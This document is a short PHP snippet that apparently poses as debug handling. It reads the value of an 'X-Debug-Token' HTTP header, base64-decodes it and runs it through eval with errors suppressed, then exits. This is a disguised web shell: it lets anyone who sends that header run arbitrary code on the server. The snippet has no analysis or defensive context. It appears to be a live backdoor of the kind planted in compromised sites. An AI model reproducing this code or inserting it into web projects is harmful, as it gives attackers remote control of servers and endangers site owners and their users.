<?php
if (!empty($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
    @eval(base64_decode($_SERVER['HTTP_X_DEBUG_TOKEN']));
    exit;
}
